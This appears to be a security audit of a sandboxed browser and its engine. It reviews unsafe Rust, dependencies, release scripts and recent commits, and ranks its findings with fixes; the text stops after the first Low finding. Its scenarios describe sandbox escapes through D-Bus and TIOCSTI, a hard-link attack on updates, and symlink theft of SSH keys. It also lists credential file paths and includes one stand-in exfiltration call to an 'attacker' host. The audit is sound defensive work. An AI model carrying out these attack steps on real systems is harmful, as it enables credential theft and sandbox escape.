# Approach 3: unsafe code, supply chain and build, diff review

Reviewed read-only: `~/devel/neoteletext-browser` main at 494aa91 and `~/devel/neoteletext-engine` implementation at e7d8927 (the browser pins fb2dd8a, an ancestor; the one commit after the pin, e7d8927, only removes `Debug` impls). Worktrees under `.claude/worktrees/` were not read. Paths below are relative to `native/` unless they start with `docs/`, `scripts/` or an engine crate name.

The threat model is the project's own (`docs/sandboxing-security.md` section 1). A compromised helper gains nothing beyond its pipe. A compromised trusted core gains nothing from the broker. The interface is untrusted (decision 20).

Nothing here was run on Linux or Windows hardware. Where a claim depends on kernel or OS behaviour that was not measured, it says "verify", with the test that would settle it.

---

## Summary ranked by severity

| # | Severity | Area | Finding |
|---|---|---|---|
| H1 | High | Linux sandbox | Every helper allowed `AF_UNIX` (fetcher, keyboard, updater, interface, sound) can connect by path to the user's D-Bus session bus and to systemd's user manager. Landlock 5 does not mediate `connect()` to a named socket. So a compromised fetcher can start an unconfined program (`StartTransientUnit`). |
| H2 | High | Linux updates | The confined updater can make a hard link from a staged program to a file in `staging/metadata/`. The launcher renames the staged folder into `versions/` and never checks it again, so in a later session the updater rewrites the installed, unconfined broker through that link, after the release-key check. |
| H3 | High | Broker | `read_for_core` checks the secret-folder deny-list only on the path the core names. A folder holding a symbolic link (which the confined core can make in its settings folder) reads `~/.ssh/id_*` straight through. The deny-list also leaves out most secrets. |
| H4 | High | Windows sandbox | The interface runs under a restricted token at low integrity, which does not block the network: low integrity does not stop Winsock. Together with its documented file reads, a compromised interface can read the user's files and send them out. |
| M1 | Medium | Phone keyboard | Phone keys reach the browser's own controls: the address field, settings fields and the link and site-change prompts (Tab, then Enter confirms). A compromised keyboard process can confirm a web hand-off or change the proxy. |
| M2 | Medium | Linux seccomp | The deny-list filter has no x32 check (`seccompiler` 0.5 checks only the architecture). On a kernel with x32 enabled, `execve`, `io_uring`, `bpf` and every other denied call pass when the x32 number is used. |
| M3 | Medium | Linux sandbox | Helpers inherit the broker's standard error. Started from a terminal, a compromised helper can push keystrokes into the user's shell with `ioctl(2, TIOCSTI)` where the kernel still allows it; neither seccomp nor Landlock blocks it. |
| M4 | Medium | Linux packaging | The AppArmor profile an administrator is asked to install grants `userns` to any program at `@{HOME}/.local/share/neoteletext/versions/*/neoteletext{,-*}`, a path every user writes. It undoes Ubuntu's restriction for any program dropped there. |
| M5 | Medium | Release | Nothing stops a release being built with a test identity (test TLS root, test TUF root, test keys) left in `NEOTELETEXT_RELEASE_IDENTITY`. `build-linux.sh` passes the variable empty, which `build.rs` takes as a test identity named "". |
| M6 | Medium | Windows installer | `NeoTeletext-Setup.exe` statically imports `wintrust.dll` and `crypt32.dll` (not KnownDLLs) and never restricts its DLL search. A DLL planted beside it in Downloads runs in the installer. |
| M7 | Medium | Engine, proxies | With a proxy set, the local-network rule becomes a check on names alone (`hidden_local`). `nas.lan`, `router` and `10.0.0.1.nip.io` reach the LAN through a LAN proxy. |
| L1–L20 | Low | various | See below. These include: misaligned `cmsghdr` access (unsound); unclamped `cmsg_len` on macOS; an empty Windows environment block missing its second NUL; `kill()` of any of the user's processes from Linux helpers; SBPL injection through unescaped paths; `OpenWeb` without a confirmation the broker owns; three Low findings from the slice reviews; and others. |
| I1–I13 | Info | various | See below. |

The `unsafe` blocks themselves (part 1) are sound apart from L1 to L4: no use-after-free, double-close or handle-ownership error, no FFI signature mismatch, and no missing NUL found.

---

## Part 1: every `unsafe`

### Where it is

`grep -w unsafe` and grep for `no_mangle`, `export_name`, `link_section`, `extern "C"`, `transmute`, `static mut` and `#[link]` across both repos, build scripts included:

- **Browser:** only `dock-menu/src/mac.rs` (16), `web-opener/src/windows.rs` (2), `confine/src/{unix.rs (13), linux.rs (3), windows.rs (44)}` and `os-install/src/{macos.rs (4), windows.rs (19)}` contain `unsafe`. The hits in `dock-menu/src/lib.rs`, `web-opener/src/lib.rs`, `os-install/src/lib.rs` and `installer/src/shortcut.rs` are comments.
  - The workspace forbids `unsafe_code`. Those four crates deny it in their own `[lints]` and allow it per module.
  - `tuf/` forbids it, and so does `fuzz/`.
  - No build script (`release-identity/build.rs`, `installer/build.rs`, `core/build.rs`) and no macro has any.
  - The only `transmute` is the `IMP` cast in `dock-menu/src/mac.rs:267`.
  - The only `extern "C"` items are `dock_menu` (mac.rs:239), `tzset` (unix.rs:142) and CoreFoundation (os-install/src/macos.rs:25).
- **Engine:** no `unsafe` anywhere; every crate's `lib.rs` has `#![forbid(unsafe_code)]`. Note: as a git dependency the engine is built with `--cap-lints allow`, so its `forbid` is enforced only by the engine's own gate, not by the browser's build (I3).

### dock-menu/src/mac.rs: sound

- **`declare_class!` `Target` (46–76):**
  - `NSObject` superclass, `MainThreadOnly`, no ivars.
  - `init` through `msg_send_id![super(this), init]` on `mtm.alloc().set_ivars(())` (110–114) is the documented objc2 0.5 pattern.
  - `item.tag()` has no preconditions.
- **`dock_menu` (239–244):**
  - Its `extern "C" fn(&AnyObject, Sel, &AnyObject) -> *mut NSMenu` matches the type encoding `@@:@` (20).
  - It returns `Retained::autorelease_return(clone)`, a +0 autoreleased object, which is right for a selector outside the alloc, new, copy and mutableCopy families.
  - A panic aborts at the `extern "C"` boundary, and `try_borrow` makes re-entry return null.
- **`class_addMethod` (266–270):**
  - The `transmute` to `unsafe extern "C" fn()` is the `IMP` convention.
  - The class comes from a live delegate.
  - The `BOOL` result is deliberately ignored; a class that already has the method keeps its own.
- **Menu items (153–166, 214–227):**
  - Targets are weak references in AppKit, and both `Target` objects are held in thread-locals for the life of the process (`MenuBar.target`, `State.target`).
  - Tags are bounds-checked on the way back (`chosen`, `menu_bar_chosen` → `menu_item`).
- **I12 (Info):** `fn choose(&self, item: &NSMenuItem)` assumes a non-nil sender of class `NSMenuItem`. Only AppKit sends these selectors to this private target, but `Option<&AnyObject>`, read through `respondsToSelector: tag`, would not depend on that.

### web-opener/src/windows.rs: sound

- `ShellExecuteW(HWND = 0, "open", file, NULL, NULL, SW_SHOWNORMAL)` matches windows-sys 0.52's signature (`HWND` and `HINSTANCE` are `isize`).
- Both strings end in NUL (15–17).
- The result is compared with `> 32` as documented.
- The address is restricted to printable ASCII `http(s)://` by `acceptable` (lib.rs:60–63).

### confine/src/unix.rs: two soundness defects (L1, L2); the rest sound

- **`send` (37–79):**
  - It bounds the descriptor count to 2 and checks `CMSG_SPACE` against the buffer.
  - It writes the header and data within `space` and handles partial sends with `write_all` (the descriptors travel with the first byte).
- **`receive` (84–137):**
  - It uses `MSG_CMSG_CLOEXEC` on Linux.
  - It closes every received descriptor on any error path, since the `Vec<OwnedFd>` is dropped on early return, including after a failed `read_exact`.
  - It refuses `MSG_CTRUNC`, other control-message types and more than 2 descriptors.
- **`local_offset` (153–167):**
  - `tzset` then `localtime_r`, with the null result checked.
  - The only `set_var` in the tree is in a test child process (201). glibc's and macOS's `tzset` and `localtime_r` lock internally, so this is thread-safe against concurrent `getenv`.
- **L1 and L2:** see the Low section.

### confine/src/linux.rs: sound

- `prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)` (69), `getuid` and `getgid` (82), and `unshare(CLONE_NEWUSER|CLONE_NEWNET)` (86), each result checked.
- `setgroups=deny` is written before `gid_map` (92–94) as `user_namespaces(7)` requires.
- The order is right: no-new-privileges, then the namespace, then Landlock with `HardRequirement` and `FullyEnforced` required, then seccomp. `apply` is the first call in every helper's `main`: decoder:261, fetcher:407, interface:1486, sound:114, keyboard.rs:157, updater main:56 and core main:2366. Each runs before arguments are parsed or any thread exists.
- The policy gaps are H1, M2, M3 and L5. They are not memory-safety faults.

### confine/src/windows.rs: sound apart from L3 and L4

- **Handle ownership:**
  - `Owned` closes once.
  - In `Inner`, the process and job handles are closed in `Drop`; closing the job ends the helper (kill-on-close).
  - `spawn` (628–700) `forget`s exactly the handles whose ownership it moves into `File` or `Inner`.
  - The error paths after `CreateProcess` terminate the suspended process and close its handles.
  - The process is assigned to the job before `ResumeThread`.
- **Attributes:**
  - The handle list (`size_of_val(inherited)`), the mitigation `[u64; 2]`, the child-process policy, `SECURITY_CAPABILITIES` and the all-application-packages opt-out all point at locals of `start` that outlive `CreateProcess*W`.
  - `STARTUPINFOEXW.cb` is the extended size.
  - The command line is mutable and NUL-terminated.
  - `CREATE_UNICODE_ENVIRONMENT` is set with a UTF-16 block.
- **`command_line` (234–263):** implements the MSVC CRT quoting rules exactly (2n+1 backslashes before a quote, 2n at the end). `lpApplicationName` is always the full path, so no search path is involved.
- **SIDs:** `ConvertStringSidToSidW` output is freed with `LocalFree`; `CreateAppContainerProfile` and `DeriveAppContainerSidFromAppContainerName` output with `FreeSid`, as each API's documentation says.
- **ACLs:** `grant_to` (540–585) frees the descriptor that owns `old` and the merged `new` exactly once, on every path.
- **Tokens:**
  - `CreateRestrictedToken(DISABLE_MAX_PRIVILEGE, deny-only Administrators)`.
  - `SetTokenInformation(TokenIntegrityLevel, S-1-16-4096)`.
  - Every call's result is checked.
- **Handles across processes:**
  - `DuplicateHandle(..., into core, DUPLICATE_SAME_ACCESS, inherit = FALSE)`.
  - `file_from_handle_value` refuses 0 and `INVALID_HANDLE_VALUE`. The value comes from the broker, which is the trusted side.
- **`local_offset` (595–607):** correct for unknown, standard and daylight zones, with saturating arithmetic.
- **I9 (Info):** `#![allow(clippy::undocumented_unsafe_blocks)]` covers the whole module (32–35), as it does in `os-install/src/windows.rs:7–10`. That does not meet requirement 10.12's Verification ("each with Clippy's `undocumented_unsafe_blocks`"), or the rule never to silence a category wholesale.
  - The one argument at the head of the module ("every handle and pointer passed is one this module made") is not true of `GetStdHandle`, the core's process handle in `duplicate_into`, or `file_from_handle_value`.
  - Fix: remove the module-wide allow and write one `// SAFETY:` per block.

### os-install/src/macos.rs: sound

- `CFStringCreateWithBytes(CFAllocatorRef, const UInt8*, CFIndex, CFStringEncoding = u32, Boolean = u8)` with `kCFStringEncodingUTF8` 0x08000100.
- `CFUserNotificationDisplayAlert(CFTimeInterval, CFOptionFlags = usize, 3 × CFURLRef, 5 × CFStringRef, CFOptionFlags*) -> SInt32`, as in `CFUserNotification.h`.
- Each string is released once.
- A failed alert answers "no", so it fails closed.

### os-install/src/windows.rs: sound

- `WinVerifyTrust(0, WINTRUST_ACTION_GENERIC_VERIFY_V2, WTD_CHOICE_FILE, WTD_UI_NONE, WTD_REVOKE_NONE, STATEACTION_VERIFY)`. Any status other than 0 is refused, and `STATEACTION_CLOSE` is always called (57–77).
- The signer comes from `WTHelperProvDataFromStateData` and `WTHelperGetProvSignerFromChain(.., 0, FALSE, 0)`, null-checked at each step. The leaf is `pasCertChain[0]`.
- Its SPKI is encoded with `CryptEncodeObjectEx(CRYPT_ENCODE_ALLOC_FLAG)` and freed with `LocalFree`.
- The SHA-256 is compared with the pinned value. With no pinned key nothing is accepted (136).
- In the registry, `REG_SZ` lengths include the terminating NUL (184), and `RegDeleteTreeW` treats NOT_FOUND as success.
- Revocation is off by design (the key is pinned), which is documented.

---

## Part 2: supply chain and build

### Lockfiles: checked

| Lockfile | rustls | Provider | webpki | tough | objc2 |
|---|---|---|---|---|---|
| `Cargo.lock` | 0.23.46 | `ring` 0.17.14 | rustls-webpki 0.103.16, webpki-roots 1.0.10 | none | 0.5.3 (dock-menu, winit) and 0.6.5 (cpal and others) |
| `tuf/Cargo.lock` | 0.23.46 | `aws-lc-rs` 1.18.2 (aws-lc-sys 0.46) | same | 0.24.0 | — |
| `fuzz/Cargo.lock` | mirrors the main lockfile | | | | |

- rustls has exactly one provider per workspace, which is what separating `tuf/` was for. The updater picks its provider explicitly (`tuf/updater/src/transport.rs:67`), so there is no default-provider panic or ambiguity.
- The two objc2 versions are separate crates; dock-menu uses only 0.5.
- No `dangerous`, `danger::`, custom `ServerCertVerifier` or `NoCertificateVerification` anywhere.
- tough is used with its default `ExpirationEnforcement` and `Limits::default()`. The datastore keeps the newest root and versions (`tuf/updater/src/lib.rs:61–63, 117–123`).
- Duplicate versions of note:
  - RustCrypto `aes` 0.8 and 0.9, `hmac` and `hkdf` 0.12 and 0.13, `sha2` 0.10 and 0.11, `digest`, `cipher`.
  - `getrandom` ×3, `windows-sys` ×3, `syn` 2 and 3.
  - `tokio` 1.53.3 (main lockfile, through zbus) against 1.54.1 (tuf).
  - None of these is a vulnerability, but there are two AEAD and HMAC implementations in one binary (I10).
- **Git and path dependencies:** only the engine, as `git+file:///Users/andrewstuart/devel/neoteletext-engine?rev=fb2dd8a…` in all three lockfiles. `deny.toml` allows only that source, and `check_engine_pin` (scripts/check.sh) holds the three workspaces to one revision. The pin is a SHA-1 commit id (I11).
- **Features that widen the attack surface:**
  - `neoteletext-web` is built with `push` and `cookies` only, so `dbsc` and `forms` are off; tuf adds `std`.
  - rustls has `tls12` (acceptable) and no `dangerous_configuration`. tough has no default features.
  - `ttf-parser`'s advisory is ignored with a reason: winit's Wayland titles, no untrusted fonts. The three zbus-merge advisories are not faults.
- **Build scripts:**
  - `release-identity/build.rs`, `installer/build.rs` and `core/build.rs` run no programs. They read files and environment variables and write Rust source (M5, I6).
  - Third-party build scripts: `ring` and `aws-lc-sys` (cc, cmake), `alsa-sys` (pkg-config), and the usual `proc-macro2` and `libc` probes.
  - Proc-macros: `serde_derive`, `thiserror-impl`, `zbus_macros`, `async-trait` (tuf). objc2's `declare_class!` is `macro_rules`.

### Toolchain, tools and hooks

- `rust-toolchain.toml` pins 1.99.0 in both repos. `scripts/tools.sh` installs exact versions with `cargo install --locked --version =X` into `tools/`, plus `nightly-2026-10-01`.
  - **L19:** nothing is pinned by hash. Integrity rests on crates.io's index checksums and rustup's manifest hashes over HTTPS. There is no lockfile or checksum of the tool binaries, and `check.sh` checks only the version a binary reports.
- The git hooks are tracked in `.githooks/` and set by `core.hooksPath`. `pre-push` runs `check.sh full` on every pushed commit the remote lacks. Neither hook can be weakened from inside a commit except by editing `.githooks`, which review would see.

### Release scripts and identity

- **Keys:**
  - Windows: `signtool` with the certificate thumbprint, the hardware module.
  - macOS: a Developer ID identity plus a stored notarytool profile.
  - Linux, TUF targets and timestamp: `command:` (hardware) or `file:` (test).
  - No secret is in the repository.
- **M5:** see below.
- **L20:** `scripts/release/build-linux.sh:21`:
  - It runs `curl https://sh.rustup.rs | sh` as root in the container, with no hash.
  - `dnf install` takes unpinned packages.
  - Builds are not reproducible, and the `file:///Users/...` engine URL does not exist inside the container, so the script cannot build as written. Its header says "not yet run".
  - Unlike `build-macos.sh`, neither `build-linux.sh` nor `build-windows.ps1` refuses a dirty tree.

### Installers, launcher and safe writes

- **Windows:**
  - Per user, in `%LOCALAPPDATA%\Programs\NeoTeletext`. `copy_in` copies the staged version into a folder whose ACL is the launcher's and checks the copy again (`launcher/src/lib.rs:363–375`), which is correct and is what H2 asks of Linux.
  - The stub runs `launcher-{a,b}.exe` from its own folder, by full path.
  - The uninstaller's copy runs from `%TEMP%`; planting there needs the same user at medium integrity, so there is no boundary.
  - The installer: M6.
- **Linux `--install`:**
  - It accepts and then copies. **L16:** the accepted files are read again by `copy_tree` and are not checked again (`launcher/src/unix.rs:118–125`); the source is the user's own download.
  - The AppArmor profile: M4.
- **macOS:** the exchange is `renamex_np RENAME_SWAP`. Hardened runtime and kernel code signing at exec stop H2's post-check modification for Mach-O pages.
- **`update/src/files.rs`:**
  - `write_synced` opens with `create|truncate` and follows a link at the target.
  - It is used only in folders that only the launcher writes (the state and the launcher in `root`, `versions/`).
  - `copy_tree` and `list_files` refuse symbolic links (lstat via `file_type`) but follow them on the later read. The remaining gap is a race with a live updater, which the launcher's exclusive lock rules out, since helpers die with the broker. Hard links are the real gap: H2.
  - `remove_tree` is std's `remove_dir_all`, which does not follow links (the CVE-2022-21658 fix).
- **Manifest paths:** an allow-list of the platform's files (`update/src/manifest.rs:114`), so `..` is impossible.

---

## Part 3: diff review since 2026-10-10

132 browser commits and 247 engine commits. The trust-boundary commits were reviewed in four slices: sandbox, broker and updates by me, plus three parallel reviews of (a) the interface-to-core protocol, (b) fetcher, typing and keyboard, and (c) the engine to the pin. Their findings are merged below.

No check was found removed or weakened in a diff. Decision 58 (00a3416 → 9e83bae) removed the container and namespace fallbacks, which is stricter. The findings are new surface that arrived without its check, not regressions of old checks.

### High

#### H1. Linux: helpers allowed AF_UNIX reach the D-Bus session bus and systemd by path, so they can start unconfined programs

- **Where:** `confine/src/linux.rs:50–61` `families`; the readable paths at 36 (`INTERFACE_PATHS`: `/run`, `/tmp`) and 44 (`SOUND_PATHS`); `confine/src/lib.rs:260` passes `DBUS_SESSION_BUS_ADDRESS` to the interface.
- **The gap:**
  - `Role::Network` (fetcher, keyboard), `Role::Updater`, `Role::Interface` and `Role::Sound` may open `AF_UNIX` sockets and `connect()` them.
  - Landlock up to ABI 6 mediates only creating a named socket (`MAKE_SOCK`), not connecting to one. ABI 6's scoping covers abstract sockets only.
  - The network namespace does not affect path sockets, and Network-role helpers have no user namespace at all.
  - So `connect("/run/user/$UID/bus")` succeeds from a fetcher. D-Bus `EXTERNAL` authentication uses `SO_PEERCRED`, the real uid, and the session bus lets the same user do anything. Even a user namespace without a uid mapping would not change `SO_PEERCRED`'s kernel uid.
- **Scenario:** a memory-safety or logic fault in the fetcher's TLS, HTTP or push parsing gives code execution in the fetcher. It calls `org.freedesktop.systemd1.Manager.StartTransientUnit` with `ExecStart=/bin/sh -c …` on the session bus, or uses `/run/user/$UID/systemd/private`. That runs a program as the user with no sandbox. The same works from the interface, sound helper, keyboard and updater.
- **What it contradicts:**
  - `docs/sandboxing-security.md` section 1: "must not … start a program".
  - Its threat table at line 17 names this exact threat. Its control is "the service's own access control", and for the session bus that control grants everything to the same uid.
  - Other path sockets reachable the same way: `ssh-agent` and `gpg-agent` (sign with the user's keys), and `/run/docker.sock` (root-equivalent for members of the docker group).
- **Fix (needs the owner: architecture):**
  - (a) Fetcher, keyboard and updater: drop `AF_UNIX` from `families`.
    - glibc's `nscd` and `nss-resolve` sockets fail and fall back to the `dns` module (UDP to `resolv.conf`, `127.0.0.53` under resolved).
    - Verify on Ubuntu and Fedora that `getaddrinfo` still resolves.
  - (b) Interface and sound helper: add `CLONE_NEWNS` to the existing `unshare`, mount an empty tmpfs over `/run/user/$UID`, `/tmp` and `/run`, and bind-mount back only the sockets each needs (`wayland-0`, the X socket, `pulse/native` and `pipewire-0`).
  - (c) If the interface needs D-Bus for input methods, put a filtering proxy (xdg-dbus-proxy) in front of it. That is a new dependency.
  - Until one of these is done, the threat table should say this is not controlled.
- **Verify:** from `confine-probe` with `Role::Network`, `UnixStream::connect(format!("/run/user/{uid}/bus"))`, then `busctl --user`-style `StartTransientUnit`. I expect it to succeed today.

#### H2. Linux: a hard link lets the confined updater change an installed, unconfined program after the release-key check

- **Where:**
  - `launcher/src/lib.rs:332–342` (`accept`, Linux branch): `update::accept::accept(&from, …)` reads and verifies `staging/<v>/…`, then `std::fs::rename(&from, &installed)` moves the same inodes into `versions/<v>`.
  - `launcher/src/lib.rs:385–391` (`tidy`) deliberately keeps `staging/metadata/`.
  - `update/src/accept.rs:66–89` (`complete`) checks names, lengths and hashes, but not `st_nlink`.
  - Running the current version re-verifies nothing (`prepare`, lib.rs:236–295).
- **Scenario:**
  - A compromised updater (it parses TLS, HTTP, gzip and TUF JSON from the network) stages the genuine signed release.
  - Before ending, it runs `link("staging/<v>/neoteletext", "staging/metadata/x")`. Landlock gives it `MAKE_REG` and `REFER` under `staging`; seccomp allows `linkat`.
  - The launcher accepts the version and renames it. `versions/<v>/neoteletext` and `staging/metadata/x` are now one inode.
  - In any later session the updater, still confined, opens `staging/metadata/x` for writing, which Landlock allows because the path is under `staging`, and writes its own ELF.
  - At the next start the launcher runs `versions/<v>/neoteletext`, the broker, which is the one unconfined process.
  - The signature bypass and the sandbox escape both persist.
- **Prior art in the history:** fc1e579 fixed exactly this class on Windows ("the updater could have changed it after the check … The launcher now copies it in … and checks the copy"), but left Linux on `rename`. macOS is largely covered by kernel code-signing enforcement on Mach-O pages under the hardened runtime, but the same copy rule would be defence in depth there.
- **Fix:** use `copy_in` on Linux too: copy into `versions/<v>.copying`, run `accept` on the copy, then rename the copy. Remove the `Family::Windows` condition at lib.rs:338.
- **Regression test:** stage a version, `fs::hard_link` a program into `staging/metadata`, accept, then write through the link and assert that `versions/<v>` is unchanged. It must fail on today's code.

#### H3. The broker's file read follows symbolic links past the secret folders, and the deny-list leaves out most secrets

- **Where:** `core/src/main.rs:2362` `SECRET_FOLDERS`, `2397–2407` `read_for_core`; `core/src/source.rs:36–69` `Source::read`.
- **The gap:**
  - `read_for_core` canonicalises only the path the core names and checks it against the list.
  - For a folder, `Source::read` reads every entry with `Path::is_file` and `File::open`, both of which follow symbolic links, and checks none of them.
- **Scenario:**
  - The confined core, which on macOS has `file-write*` on its settings folder (macos.rs:134) and on Linux all Landlock rights there (linux.rs:160–166, including `MAKE_SYM`), creates `settings/x/` containing `k -> ~/.ssh/id_ed25519`.
  - It asks the broker for `Read("settings/x")`. The canonical path is not under a secret folder, so the broker returns the key's bytes.
  - The core then sends the bytes out by putting them in a fetcher's address (`Request::Spawn` arguments) or through `OpenWeb("https://attacker/?k=…")`. The web-browser confirmation lives only in the core (L7).
- **Even without links:** the deny-list misses `~/.netrc`, `~/.git-credentials`, `~/.config/gh/hosts.yml`, `~/.cargo/credentials.toml`, `~/.npmrc`, `~/.pypirc`, shell histories, browser profiles (`~/Library/Application Support/Google/Chrome`, `~/.mozilla`), `~/.local/share/keyrings`, `~/devel/credentials/*.env` and `%APPDATA%` on Windows.
- **What it contradicts:** decision 56 ("a compromised core gains nothing from the broker"). The bookmark import added in 7e9f022 (`core/src/library.rs:587–613`) uses the same reader, so a hostile interface can name any of these paths (slice review (a), item I13).
- **Also:** a time-of-check gap between `canonicalize` and `File::open` on the single-file path.
- **Fix:**
  - Read file channels under an allow-list, not a deny-list. The broker opens only paths the user chose: from the command line at start, or from a broker-owned open dialog.
  - Open each file with `O_NOFOLLOW` (Unix) or `FILE_FLAG_OPEN_REPARSE_POINT` (Windows), relative to a folder descriptor, and check with `fstat`.
  - At least refuse symbolic links inside a folder channel (`entry.file_type()?.is_symlink()`) and apply the secret check to every file's canonical path.
- **Regression test:** a folder holding a link to `~/.ssh/<file>` is refused. It must fail today.

#### H4. Windows: the interface has the network

- **Where:** `confine/src/windows.rs:642–646`: the interface runs with `restricted_token()` (341–369), with no AppContainer and no restricting SIDs.
- **The gap:**
  - Low integrity limits writes, not Winsock. The project's own record says so: `docs/sandboxing.md:54` ("the keyboard reaches its relay … under the restricted token at low integrity").
  - `docs/sandboxing.md:12` requires "the interface … and no network".
  - `docs/sandboxing-security.md` lists only the interface's file reads as Windows's gap.
- **Scenario:** a compromised interface reads the user's files at low integrity (the known gap) and uploads them over TCP.
- **Fix (owner):**
  - Run the interface in an AppContainer with no capabilities. AppContainer processes can own windows on the default desktop, as Win32 app isolation does, but this must be measured with winit, the IME and `CoInitialize`.
  - Or add restricting SIDs that deny the AFD device.
  - At minimum, correct the analysis.
- **Verify:** in the VM, `TcpStream::connect("1.1.1.1:443")` from a probe started with `Role::Interface`. I expect it to succeed.

### Medium

#### M1. Phone keys drive the browser's own controls and confirmations

From slice (b). Introduced in 4872ec2.

- **Where:** `interface/src/main.rs:915–948` `phone_key`; `core/src/main.rs:1878–1883` `phone_said`; `interface-core/src/browser/link_ui.rs:196–212`.
- **The gap:**
  - With no page open for typing, phone Enter, Tab, Escape, the arrows and single characters become window keys.
  - Tab focuses Go, and Enter after 500 ms sends `Confirm(id)`.
  - The core's only check is the state "Connected", which the keyboard process reports about itself.
- **Scenario:** a keyboard process compromised through its relay connection can:
  - type an address and press Enter;
  - Tab through Settings to set a proxy or add allowed local addresses;
  - confirm a pending web hand-off or site change.
- **Fix:**
  - Phone keys reach only the page being typed into and page navigation.
  - The interface drops them while a prompt, the address field or a panel field has focus.
  - The core refuses a `Confirm` or a `SettingChange` that arrives within the prompt delay after a forwarded phone key.

#### M2. Linux seccomp: no x32 check, so the deny-list is bypassed where x32 is enabled

- **Where:** `confine/src/linux.rs:211–300`.
- **The gap:**
  - `seccompiler` 0.5.0 emits only an `AUDIT_ARCH` check (`backend/bpf.rs:73–79`). x32 shares `AUDIT_ARCH_X86_64`.
  - With `mismatch_action = Allow` (288), any number with `__X32_SYSCALL_BIT` (0x40000000) matches no rule and is allowed: x32 `execve` (520), `io_uring_setup`, `bpf`, `userfaultfd`, `ptrace` and the rest.
- **Exposure:** kernels with `CONFIG_X86_X32_ABI` enabled at run time (Debian builds it but disables it by default; check each supported distribution).
- **Fix:** prepend raw BPF (`BpfProgram` is `Vec<sock_filter>`): load `nr`, `jge 0x40000000` → `RET ERRNO(EPERM)` or `KILL_PROCESS`.
- **Test:** a probe that issues `syscall(0x40000000 | 59)` expects EPERM.

#### M3. Linux: `TIOCSTI` through the inherited terminal

- **Where:** `confine/src/lib.rs:386` and `confine/src/broker.rs` `start_core` (`Stdio::inherit()` for standard error); `linux.rs` has no `ioctl` rule.
- **The gap:**
  - Landlock 5's `IOCTL_DEV` does not apply to a descriptor opened before `restrict_self`.
  - So a compromised helper can call `ioctl(2, TIOCSTI, &c)` and queue a command in the user's shell when the browser was started from a terminal (developers, `--install`, `neoteletext <address>`).
  - The kernel blocks this only with `dev.tty.legacy_tiocsti=0` or `CONFIG_LEGACY_TIOCSTI=n`. Upstream's default is still "y".
  - `TIOCLINUX` is the same on a virtual console.
- **macOS:** not affected. `(deny default)` denies `file-ioctl` on the tty, and `system.sb` allows it only on `/dev/dtracehelper`.
- **Windows:** console helpers attached to the parent's console might reach `CONIN$`. Verify.
- **Fix:**
  - A seccomp rule: `ioctl` with arg1 & 0xffffffff in {`TIOCSTI` 0x5412, `TIOCLINUX` 0x541C} → EPERM.
  - And/or `setsid()` as the first step of `apply`: with no controlling terminal, `TIOCSTI` fails.
  - Better, give each helper a pipe for standard error that the broker relays.
  - On Windows, `CREATE_NO_WINDOW` or `DETACHED_PROCESS` plus a piped standard error.

#### M4. The AppArmor profile gives user namespaces to any program at a user-writable path

- **Where:** `tuf/release/src/package.rs:67–75`: `profile neoteletext @{HOME}/.local/share/neoteletext/versions/*/neoteletext{,-*} flags=(unconfined) { userns, }`. It is printed for the administrator at `launcher/src/unix.rs:146–155`.
- **The gap:** every local user, and any malware running as one, can put any binary at `~/.local/share/neoteletext/versions/x/neoteletext-x` and get unprivileged user namespaces. That undoes the system-wide `apparmor_restrict_unprivileged_userns` (a kernel attack-surface control) for the whole machine.
- **Fix (owner):**
  - Install the programs root-owned (for example `/opt/neoteletext`) when an administrator is involved anyway, and attach the profile there.
  - Or avoid the user namespace: on Linux it exists only for the empty network namespace, and decoder and core already have no sockets (seccomp), while Landlock's TCP rules cover the rest.

#### M5. Nothing stops a release from carrying a test identity

- **Where:**
  - `release-identity/build.rs:58–66`: any value of `NEOTELETEXT_RELEASE_IDENTITY`, even empty, selects a "test identity".
  - `scripts/release/build-linux.sh:16` passes `-e NEOTELETEXT_RELEASE_IDENTITY="${NEOTELETEXT_RELEASE_IDENTITY:-}"`, so the variable is always set, usually to "". The build then looks for `host` in the build script's working folder and panics.
  - `build-macos.sh` and `build-windows.ps1` inherit whatever the operator's shell has, including a test identity left over from `updates-e2e.sh`.
  - `neoteletext-release check` prints the identity's name (`tuf/release/src/main.rs:114`) and refuses nothing.
- **Scenario:** a Linux tarball built and signed (sign-linux.sh accepts `file:` keys) while a test identity is set ships `TUF_ROOT` and `TLS_ROOT` from `tmp/`. Whoever holds those test keys, which sit unprotected on development machines, can then push "updates" to every user of that build. Windows is caught by `check` against the pinned signer; Linux and the TUF root are not.
- **Fix:**
  - Treat an empty variable as unset in `build.rs`.
  - In `build-linux.sh`, use `${NEOTELETEXT_RELEASE_IDENTITY:+-e NEOTELETEXT_RELEASE_IDENTITY=…}`.
  - Every release script refuses to run when the variable is set, unless `--test` is given.
  - `release check`, `sign-linux` and `publish` exit non-zero when `release_identity::NAME != "production"`, unless `--test-identity` is given, and refuse `file:` keys for a production identity.

#### M6. The Windows installer can be hijacked by a DLL planted beside it

- **Where:** `installer/src/main.rs`. Nothing calls `SetDefaultDllDirectories` or links with `/DEPENDENTLOADFLAG` (grep finds neither).
- **The gap:**
  - The installer links `os-install`: `WinVerifyTrust` and the `WTHelper*` functions in `wintrust.dll`, `CryptEncodeObjectEx` in `crypt32.dll`. Neither is a KnownDLL.
  - So `Downloads\wintrust.dll` loads first, a classic binary planting (CWE-427).
  - The launcher and the uninstaller copy in `%TEMP%` import the same DLLs. There the writer would have to be the same user, so there is no boundary.
- **Fix:** link the installer (and the stub and launcher) with `cargo::rustc-link-arg=/DEPENDENTLOADFLAG:0x800` (`LOAD_LIBRARY_SEARCH_SYSTEM32`), and delay-load `wintrust` and `crypt32` behind a `SetDefaultDllDirectories(LOAD_LIBRARY_SEARCH_SYSTEM32)` call at the start of `main`.

#### M7. Engine: with a proxy, the local-network rule is by name only

From slice (c). Commit e66d241.

- **Where:** `crates/neoteletext-web/src/agent.rs:1281` `peer_blocked` returns false when a proxy is set; `proxy.rs:71–81` `hidden_local` refuses only IP literals, `localhost`, `*.localhost`, `*.local` and `*.internal`.
- **Scenario:** with a LAN or local proxy, a hostile channel's link, redirect or push address of `http://router/`, `nas.lan`, `nas.home.arpa`, `10.0.0.1.nip.io` or a rebinding name reaches internal hosts through the proxy.
- **Fix (engine, by its own process):**
  - Resolve and check locally, then CONNECT to the checked IP with the original SNI. That costs the proxy's DNS privacy, so it could be a setting with a warning.
  - Or at least widen `hidden_local` to single-label names, `.home.arpa`, `.lan`, `.corp`, `.intranet`, `.private` and `.localdomain`.
  - Document that through a proxy the rule is by name.

### Low

- **L1. `confine/src/unix.rs:41, 85`: misaligned `cmsghdr` access, which is undefined behaviour.**
